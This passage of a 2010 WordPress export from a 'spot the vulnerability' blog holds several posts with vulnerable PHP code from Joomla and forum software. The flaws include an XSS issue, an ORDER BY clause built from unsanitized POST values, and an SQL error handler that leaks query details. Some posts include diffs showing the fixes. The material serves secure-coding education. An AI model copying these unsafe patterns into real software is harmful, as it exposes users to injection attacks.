Name="Medium Grid 1" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 1" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 1" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 1" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 1" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 1" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 1" /> <w:LsdException Locked="false" UnhideWhenUsed="false" Name="Revision" /> <w:LsdException Locked="false" Priority="34" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="List Paragraph" /> <w:LsdException Locked="false" Priority="29" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Quote" /> <w:LsdException Locked="false" Priority="30" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Quote" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 1" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 1" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 1" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 1" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 1" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 1" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 1" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 1" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 2" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 2" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 2" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 2" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 2" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 2" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 2" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 2" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 2" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 2" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 2" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 2" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 2" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 2" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 3" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 3" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 3" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 3" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 3" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 3" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 3" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 3" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 3" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 3" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 3" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 3" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 3" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 3" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 4" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 4" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 4" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 4" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 4" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 4" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 4" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 4" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 4" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 4" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 4" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 4" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 4" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 4" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 5" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 5" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 5" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 5" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 5" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 5" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 5" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 5" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 5" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 5" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 5" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 5" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 5" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 5" /> <w:LsdException Locked="false" Priority="60" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Shading Accent 6" /> <w:LsdException Locked="false" Priority="61" SemiHidden="false"    UnhideWhenUsed="false" Name="Light List Accent 6" /> <w:LsdException Locked="false" Priority="62" SemiHidden="false"    UnhideWhenUsed="false" Name="Light Grid Accent 6" /> <w:LsdException Locked="false" Priority="63" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 1 Accent 6" /> <w:LsdException Locked="false" Priority="64" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Shading 2 Accent 6" /> <w:LsdException Locked="false" Priority="65" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 1 Accent 6" /> <w:LsdException Locked="false" Priority="66" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium List 2 Accent 6" /> <w:LsdException Locked="false" Priority="67" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 1 Accent 6" /> <w:LsdException Locked="false" Priority="68" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 2 Accent 6" /> <w:LsdException Locked="false" Priority="69" SemiHidden="false"    UnhideWhenUsed="false" Name="Medium Grid 3 Accent 6" /> <w:LsdException Locked="false" Priority="70" SemiHidden="false"    UnhideWhenUsed="false" Name="Dark List Accent 6" /> <w:LsdException Locked="false" Priority="71" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Shading Accent 6" /> <w:LsdException Locked="false" Priority="72" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful List Accent 6" /> <w:LsdException Locked="false" Priority="73" SemiHidden="false"    UnhideWhenUsed="false" Name="Colorful Grid Accent 6" /> <w:LsdException Locked="false" Priority="19" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtle Emphasis" /> <w:LsdException Locked="false" Priority="21" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Emphasis" /> <w:LsdException Locked="false" Priority="31" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Subtle Reference" /> <w:LsdException Locked="false" Priority="32" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Intense Reference" /> <w:LsdException Locked="false" Priority="33" SemiHidden="false"    UnhideWhenUsed="false" QFormat="true" Name="Book Title" /> <w:LsdException Locked="false" Priority="37" Name="Bibliography" /> <w:LsdException Locked="false" Priority="39" QFormat="true" Name="TOC Heading" /> </w:LatentStyles> </xml><![endif]--><!--  /* Font Definitions */  @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-520092929 1073786111 9 0 415 0;} @font-face 	{font-family:"Lucida Console"; 	panose-1:2 11 6 9 4 5 4 2 2 4; 	mso-font-charset:0; 	mso-generic-font-family:modern; 	mso-font-pitch:fixed; 	mso-font-signature:-2147482993 6144 0 0 31 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:""; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:"Calibri","sans-serif"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:Calibri; 	mso-fareast-theme-font:minor-latin; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} span.apple-style-span 	{mso-style-name:apple-style-span; 	mso-style-unhide:no;} span.re0 	{mso-style-name:re0; 	mso-style-unhide:no;} span.apple-converted-space 	{mso-style-name:apple-converted-space; 	mso-style-unhide:no;} span.sy0 	{mso-style-name:sy0; 	mso-style-unhide:no;} span.kw3 	{mso-style-name:kw3; 	mso-style-unhide:no;} span.br0 	{mso-style-name:br0; 	mso-style-unhide:no;} span.kw4 	{mso-style-name:kw4; 	mso-style-unhide:no;} span.kw2 	{mso-style-name:kw2; 	mso-style-unhide:no;} span.kw1 	{mso-style-name:kw1; 	mso-style-unhide:no;} span.sy1 	{mso-style-name:sy1; 	mso-style-unhide:no;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	font-family:"Calibri","sans-serif"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:Calibri; 	mso-fareast-theme-font:minor-latin; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page WordSection1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.WordSection1 	{page:WordSection1;} --><!--[if gte mso 10]> <mce:style><!   /* Style Definitions */  table.MsoNormalTable 	{mso-style-name:"Table Normal"; 	mso-tstyle-rowband-size:0; 	mso-tstyle-colband-size:0; 	mso-style-noshow:yes; 	mso-style-priority:99; 	mso-style-parent:""; 	mso-padding-alt:0in 5.4pt 0in 5.4pt; 	mso-para-margin-top:0in; 	mso-para-margin-right:0in; 	mso-para-margin-bottom:10.0pt; 	mso-para-margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:"Calibri","sans-serif"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:"Times New Roman"; 	mso-bidi-theme-font:minor-bidi;} --> <!--[endif]--></div>
<h2>Developers Solution</h2>
[cce lang="diff"]

&lt;?php

function display( &amp;$rows, $params, $pageNav, $limitstart, $limit, $total, $totalRows, $searchword ) {
global $mosConfig_hideCreateDate;
global $mosConfig_live_site, $option, $Itemid;

$c             = count ($rows);
$image         = mosAdminMenus::ImageCheck( 'google.png', '/images/M_images/', NULL, NULL, 'Google', 'Google', 1 );
$searchword = urldecode( $searchword );
$searchword    = htmlspecialchars($searchword, ENT_QUOTES);

// number of matches found
echo '&lt;br/&gt;';
eval ('echo "'._CONCLUSION.'";');

?&gt;
&lt;a href="http://www.google.com/search?q=&lt;?php echo $searchword; ?&gt;" target="_blank"&gt;
&lt;?php echo $image; ?&gt;&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;


...

&lt;?php
function conclusion( $searchword, $pageNav ) {
global $mosConfig_live_site, $option, $Itemid;

$ordering         = strtolower( strval( mosGetParam( $_REQUEST, 'ordering', 'newest' ) ) );
$searchphrase     = strtolower( strval( mosGetParam( $_REQUEST, 'searchphrase', 'any' ) ) );

$searchphrase    = htmlspecialchars($searchphrase);
+$searchword = urldecode( $searchword );
+$searchword    = htmlspecialchars($searchword, ENT_QUOTES);

$link             = $mosConfig_live_site ."/index.php?option=$option&amp;Itemid=$Itemid&amp;searchword=$searchword&amp;searchphrase=$searchphrase&amp;ordering=$ordering";
?&gt;
&lt;tr&gt;
&lt;td colspan="3"&gt;
&lt;div align="center"&gt;
&lt;?php echo $pageNav-&gt;writePagesLinks( $link ); ?&gt;
&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;?php
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>640</wp:post_id>
		<wp:post_date>2010-01-08 08:00:14</wp:post_date>
		<wp:post_date_gmt>2010-01-08 15:00:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>keep-carving-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="joomla"><![CDATA[Joomla]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[44f935665c16b21741fc98d5f472f96f]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/6x5z5k]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#code #development]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fishing and Standing</title>
		<link>http://spotthevuln.com/2010/01/fishing-and-standing/</link>
		<pubDate>Mon, 11 Jan 2010 15:00:52 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=646</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>There is a fine line between fishing and just standing on the shore like an idiot.

- Steven Wright</blockquote>
[ccnLe_php]
$form['username'] = $_POST['username'];
($hook = get_hook('aus_find_user_selected')) ? eval($hook) : null;

...

$registered_after = forum_trim($_POST['registered_after']);
$registered_before = forum_trim($_POST['registered_before']);
$order_by = $_POST['order_by'];
$direction = $_POST['direction'];
$user_group = $_POST['user_group'];
...

// Load the misc.php language file
require FORUM_ROOT.'lang/'.$forum_user['language'].'/misc.php';

// Find any users matching the conditions
$query = array(
'SELECT'    =&gt; 'u.id, u.username, u.email, u.title, u.num_posts, u.admin_note, g.g_id, g.g_user_title',
'FROM'        =&gt; 'users AS u',
'JOINS'        =&gt; array(
array(
'LEFT JOIN'        =&gt; 'groups AS g',
'ON'            =&gt; 'g.g_id=u.group_id'
)
),
'WHERE'        =&gt; 'u.id&gt;1 AND '.implode(' AND ', $conditions),
'ORDER BY'  =&gt; $order_by.' '.$direction <ins></ins>
);

[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>646</wp:post_id>
		<wp:post_date>2010-01-11 08:00:52</wp:post_date>
		<wp:post_date_gmt>2010-01-11 15:00:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fishing-and-standing</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[65e2e80d3e26beaf77ed803318cec730]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/8ZyqJJ]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_display_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title_multi</wp:meta_key>
			<wp:meta_value><![CDATA[Fishing and Standing]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_body_title</wp:meta_key>
			<wp:meta_value><![CDATA[Fishing and Standing]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_title</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_keywords</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>bfa_ata_meta_description</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Fishing and Standing - SQL Injection</title>
		<link>http://spotthevuln.com/2010/01/fishing-and-standing-sql-injection/</link>
		<pubDate>Fri, 15 Jan 2010 15:00:10 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=651</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Joomla

Fixed in Version: 1.x

Issue Type: SQL Injection

Original Code: <a title="Fishing and Standing" href="http://spotthevuln.com/2010/01/fishing-and-standing/" target="_blank">Found Here</a>
<h2>Description</h2>
Straight up SQL injection in Joomla.  The $order_by and the $direction values are taken directly from POST parameters.  They are then passed to a SQL statement as part of ORDER BY clause without sanitization.  The attacker is free to use traditional SQL injection methods to pass malicious SQL statements to the backend database.

This bug was fixed by sanitizing the values passed to $order_by and $direction.  I like the fact that the Joomla developers used a whitelist to restrict the values passed to $order_by and $direction. The whitelist is established in the following line of code:
<blockquote>if (!in_array($order_by, array('username', 'email', 'num_posts', 'num_posts', 'registered')) || !in_array($direction, array('ASC', 'DESC')))</blockquote>
The code above makes it so the $order_by variable can only contain the following values: 'username', 'email', 'num_posts', 'num_posts', 'registered'.  The line also ensure the $direction variable only contains either ‘ASC’ or ‘DESC’.

In addition to the whitelist, the Joomla developers also escaped the variables before including them in the SQL statement.
<blockquote>

'ORDER BY'  =&gt; $forum_db-&gt;escape($order_by).' '.$forum_db-&gt;escape($direction)</blockquote>
<h2>Developers Solution</h2>
[cce lang="diff"]
$form['username'] = $_POST['username'];

+//Check up for order_by and direction values
+$order_by = isset($_POST['order_by']) ? forum_trim($_POST['order_by']) : null;
+$direction = isset($_POST['direction']) ? forum_trim($_POST['direction']) : null;
+if ($order_by == null || $direction == null)
+    message($lang_common['Bad request']);
+if (!in_array($order_by, array('username', 'email', 'num_posts', 'num_posts', 'registered')) || !in_array($direction, array('ASC', 'DESC')))
+    message($lang_common['Bad request']);

($hook = get_hook('aus_find_user_selected')) ? eval($hook) : null;

...

$registered_after = forum_trim($_POST['registered_after']);
$registered_before = forum_trim($_POST['registered_before']);
-$order_by = $_POST['order_by'];
-$direction = $_POST['direction'];
$user_group = $_POST['user_group'];
...

// Load the misc.php language file
require FORUM_ROOT.'lang/'.$forum_user['language'].'/misc.php';

// Find any users matching the conditions
$query = array(
'SELECT'    =&gt; 'u.id, u.username, u.email, u.title, u.num_posts, u.admin_note, g.g_id, g.g_user_title',
'FROM'        =&gt; 'users AS u',
'JOINS'        =&gt; array(
array(
'LEFT JOIN'        =&gt; 'groups AS g',
'ON'            =&gt; 'g.g_id=u.group_id'
)
),
'WHERE'        =&gt; 'u.id&gt;1 AND '.implode(' AND ', $conditions),
+       'ORDER BY'  =&gt; $forum_db-&gt;escape($order_by).' '.$forum_db-&gt;escape($direction)
-     'ORDER BY'  =&gt; $order_by.' '.$direction
);


[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>651</wp:post_id>
		<wp:post_date>2010-01-15 08:00:10</wp:post_date>
		<wp:post_date_gmt>2010-01-15 15:00:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>fishing-and-standing-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[50d8ee7a2fe89653d27556912240d3d9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/6jeUXi]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Temptation</title>
		<link>http://spotthevuln.com/2010/01/temptation/</link>
		<pubDate>Mon, 18 Jan 2010 15:00:33 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=655</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Don't worry about temptation--as you grow older, it starts avoiding you. -- Old Farmer's Almanac</blockquote>
[ccnLe_php]

function sql_freeresult($query_id = false)
{
if (!$query_id)
{
$query_id = $this-&gt;query_result;
}

return ($query_id) ? @mysql_free_result($query_id) : false;

}


function sql_escape($msg)
{

return mysql_escape_string(stripslashes($msg));

}



function sql_error($sql = '')
{

$result = array(

'message' =&gt; @mysql_error(),
'code' =&gt; @mysql_errno()

);


if (!$this-&gt;return_on_error)
{

if ($this-&gt;transaction)
{

$this-&gt;sql_transaction('rollback');

}

$this_page = (!empty($_SERVER['PHP_SELF'])) ? $_SERVER['PHP_SELF'] : $_ENV['PHP_SELF'];
$this_page .= '&amp;' . ((!empty($_SERVER['QUERY_STRING'])) ? $_SERVER['QUERY_STRING'] : $_ENV['QUERY_STRING']);


$message = '&lt;u&gt;SQL ERROR&lt;/u&gt; [ ' . SQL_LAYER . ' ]&lt;br /&gt;&lt;br /&gt;' . @mysql_error() . '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;CALLING PAGE&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;'  . $this_page . (($sql != '') ? '&lt;br /&gt;&lt;br /&gt;&lt;u&gt;SQL&lt;/u&gt;&lt;br /&gt;&lt;br /&gt;' . $sql : '') . '&lt;br /&gt;';

trigger_error($message, E_USER_ERROR);

}


return $result;

}


} // class sql_db


} // if ... define

